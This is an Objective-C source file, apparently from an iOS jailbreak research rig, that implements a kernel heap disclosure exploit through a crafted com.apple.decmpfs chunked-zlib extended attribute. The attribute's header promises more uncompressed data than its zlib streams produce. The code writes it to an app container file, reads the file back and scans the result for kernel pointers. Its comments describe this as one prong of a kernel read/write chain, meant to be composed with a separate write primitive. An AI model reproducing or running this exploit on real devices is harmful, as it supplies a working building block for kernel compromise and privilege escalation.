//
//  P126DecmpfsLeak.m — kernel heap DISCLOSURE through a short-producing
//  chunked zlib xattr. p126. P007 rig.
//
//  Source: Cinder27 module kern.decmpfs (CVE-2026-113910 / jbjflab git,
//  vendored at jb-sources/cinder27-jbjflab), C-twin logic ported verbatim.
//  The fleet angle: this is a kernel-content READ from a plain app —
//  the missing read-side piece the KRW formula needed (the leak band =
//  kernel heap; the read prong so far = p116 files + the sel-8 KVA).
//
//  Mechanism: com.apple.decmpfs type-4 (chunked zlib) xattr whose chunk
//  table promises N uncompressed bytes but each zlib stream PRODUCES fewer;
//  AppleFSCompressionTypeZlib hands the reader the uninitialised remainder
//  of the destination buffer. Reading the file back = scanning decoded
//  bytes for kernel pointers. Fixed-class per Cinder27's 27.2 note (verify
//  on 27.2: the negative control).
//
//  HONESTY: read-only (set xattr on OUR OWN container file, read it back,
//  delete). No race, no panic risk. hasKread stays NO unless the scan
//  actually retrieves kernel bytes — that receipt would flip the READ
//  prong's law class, not the board's kread32 gate.
//

#import "P126DecmpfsLeak.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <fcntl.h>
#import <sys/xattr.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P126_BUILD @"p126-decmpfsleak-v1"

typedef struct { uint8_t *d; size_t n, cap; } p126buf;
static void p126_bneed(p126buf *b, size_t extra) {
    if (b->n + extra > b->cap) { b->cap = (b->n + extra) * 2 + 64; b->d = realloc(b->d, b->cap); }
}
static void p126_bput(p126buf *b, uint8_t v) { p126_bneed(b, 1); b->d[b->n++] = v; }
static void p126_bcat(p126buf *b, const void *p, size_t n) { p126_bneed(b, n); memcpy(b->d + b->n, p, n); b->n += n; }
static void p126_brep(p126buf *b, uint8_t v, size_t n) { p126_bneed(b, n); memset(b->d + b->n, v, n); b->n += n; }
static void p126_bfree(p126buf *b) { free(b->d); b->d = NULL; b->n = b->cap = 0; }
static void p126_le16(p126buf *b, uint16_t v) { p126_bput(b, v & 0xff); p126_bput(b, v >> 8); }
static void p126_le32(p126buf *b, uint32_t v) {
    p126_bput(b, v & 0xff); p126_bput(b, (v >> 8) & 0xff); p126_bput(b, (v >> 16) & 0xff); p126_bput(b, (v >> 24) & 0xff);
}
static void p126_le64(p126buf *b, uint64_t v) {
    for (int i = 0; i < 8; i++) p126_bput(b, (uint8_t)((v >> (8 * i)) & 0xff));
}
static void p126_be32(p126buf *b, uint32_t v) {
    p126_bput(b, v >> 24); p126_bput(b, (v >> 16) & 0xff); p126_bput(b, (v >> 8) & 0xff); p126_bput(b, v & 0xff);
}
static uint32_t p126_adler32(const uint8_t *p, size_t n) {
    uint32_t a = 1, bb = 0;
    for (size_t i = 0; i < n; i++) { a = (a + p[i]) % 65521; bb = (bb + a) % 65521; }
    return (bb << 16) | a;
}

/* the Cinder27 seed: 'cmpf' type-4 chunked zlib, per-chunk streams that
 * produce `produce` bytes each while the offset table still promises the
 * full chunk span to the reader */
static p126buf p126_chunked(size_t uncompressed, int chunk_count, size_t produce) {
    p126buf out = {0};
    p126_le32(&out, 0x636D7066);            /* 'cmpf' */
    p126_le32(&out, 4);                     /* typeZlibChunked */
    p126_le64(&out, (uint64_t)uncompressed);

    p126buf payload = {0};
    p126_brep(&payload, 0x41, produce);
    p126buf z = {0};
    p126_bput(&z, 0x78); p126_bput(&z, 0x01);   /* zlib header */
    if (payload.n == 0) p126_bcat(&z, "\x01\x00\x00\xFF\xFF", 5);
    size_t off = 0;
    while (off < payload.n) {
        size_t take = payload.n - off < 65535 ? payload.n - off : 65535;
        p126_bput(&z, off + take >= payload.n ? 0x01 : 0x00);
        p126_le16(&z, (uint16_t)take);
        p126_le16(&z, (uint16_t)~take);
        p126_bcat(&z, payload.d + off, take);
        off += take;
    }
    p126_be32(&z, p126_adler32(payload.d, payload.n));

    uint32_t offsets[10];
    if (chunk_count > 9) chunk_count = 9;
    uint32_t running = 0;
    for (int i = 0; i < chunk_count; i++) {
        offsets[i] = running;
        running += (uint32_t)(1 + z.n);
    }
    offsets[chunk_count] = running;   /* verbatim Cinder27: the table is
         coherent with the CHUNKS; the LIE is the 'cmpf' header's
         uncompressed size vs the tiny streams (the under-produce = the
         reader walks past the decoded bytes into the buffer remainder) */
    for (int i = 0; i <= chunk_count; i++) p126_le32(&out, offsets[i]);
    for (int i = 0; i < chunk_count; i++) { p126_bput(&out, 0x00); p126_bcat(&out, z.d, z.n); }

    p126_bfree(&payload);
    p126_bfree(&z);
    return out;
}

static NSMutableString *g_buf;
static void L(NSString *s) {
    if (!g_buf) return;
    [g_buf appendString:s];
    if (![s hasSuffix:@"\n"]) [g_buf appendString:@"\n"];
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static BOOL p126_kernel_ptr(uint64_t v) { return v >= 0xFFFFFFE000000000ULL; }

@implementation P126DecmpfsLeak

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    Lf(@"=== p126 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P126_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] CVE-2026-113910 (Cinder27 kern.decmpfs, vendored jbjflab): a");
    L(@"  crafted com.apple.decmpfs chunked-zlib xattr UNDER-PRODUCES vs its");
    L(@"  chunk table; the kernel hand-back carries the UNINITIALISED remainder");
    L(@"  = kernel heap disclosure. Scan = decoded u64 >= 0xFFFFFFE000000000.");
    L(@"  READ-ONLY class (our container file; unlink after). 27.2 = the");
    L(@"  negative control per Cinder27's fix note.");

    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];

    struct { size_t uncomp; int chunks; size_t produce; const char *tag; } rounds[] = {
        { 0x1000,  2, 0x10,   "lie-big (table promises 4K, chunks carry 16B)"  },
        { 0x4000,  4, 0x40,   "lie-page"                                       },
        { 0x10000, 9, 0x200,  "lie-64K"                                        },
    };
    long cumulative_hits = 0;
    for (int rd = 0; rd < (int)(sizeof rounds / sizeof rounds[0]); rd++) {
        NSString *path = [docs stringByAppendingPathComponent:
            [NSString stringWithFormat:@"p126_seed_%d.bin", rd]];
        const char *cp = path.fileSystemRepresentation;
        unlink(cp);
        long hits = 0, readBack = 0;
        BOOL wrote = NO;
        /* seed the plain file (the uncompressed claim) */
        int fd = open(cp, O_WRONLY | O_CREAT, 0644);
        if (fd >= 0) {
            uint8_t fill[4096];
            memset(fill, 0x41, sizeof fill);
            size_t left = rounds[rd].uncomp;
            size_t take0 = left < 64 ? 64 : left;
            while (left > 0) {
                size_t t = left < sizeof fill ? left : sizeof fill;
                if (write(fd, fill, t) != (ssize_t)t) break;
                left -= t;
            }
            close(fd);
        }
        p126buf x = p126_chunked(rounds[rd].uncomp, rounds[rd].chunks, rounds[rd].produce);
        if (setxattr(cp, "com.apple.decmpfs", x.d, x.n, 0, 0) == 0) {
            wrote = YES;
        } else {
            Lf(@"[%s] setxattr failed errno=%d", rounds[rd].tag, errno);
        }
        p126_bfree(&x);
        if (wrote) {
            FILE *f = fopen(cp, "rb");
            if (f) {
                static uint8_t rb[0x20000];
                size_t got = fread(rb, 1, sizeof rb, f);
                fclose(f);
                readBack = (long)got;
                for (size_t o = 0; o + 8 <= got; o += 8) {
                    uint64_t v = 0;
                    memcpy(&v, rb + o, 8);
                    if (p126_kernel_ptr(v)) {
                        hits++;
                        if (hits <= 2)
                            Lf(@"[%s] KERNEL PTR @off 0x%zx = 0x%016llx",
                               rounds[rd].tag, o, (unsigned long long)v);
                    }
                }
            }
            Lf(@"[%s] wrote_xattr=1 read_back=%ld kernel_ptr_hits=%ld%s",
               rounds[rd].tag, readBack, hits,
               hits > 0 ? "  <<<< KERNEL-CONTENT READ RECEIPT CLASS" : "");
        }
        cumulative_hits += hits;
        unlink(cp);   /* clean our container */
    }

    L(@"");
    L(@"=== VERDICT (honest) ===");
    if (cumulative_hits > 0) {
        Lf(@"- hits=%ld = the kernel heap reached the reader through the decmpfs", cumulative_hits);
        L(@"  short-chunk path = a kernel-content READ from a plain app (the");
        L(@"  KRW formula's read prong, heap-disclosure class). NOT hasKread:");
        L(@"  the board's kread32(kbase) gate needs a targeted kernel read,");
        L(@"  this is a leak receipt. Samples above = the pointers.");
        L(@"- Compose: leak (this) + EMBERFORGE write prong (p044 v78) = two");
        L(@"  of the three KRW components live in the free app tonight.");
    } else {
        L(@"- 0 hits = the under-produce path is fixed/prefixed on THIS build,");
        L(@"  or the decoder zero-fills. 27.2's fix class per Cinder27 = re-run");
        L(@"  on the 17's 24A435: the negative control confirms the version law.");
    }
    L(@"hasKread=NO. READ-ONLY: xattr + file read on our container only.");
    return g_buf ?: @"(no p126 log)";
}

@end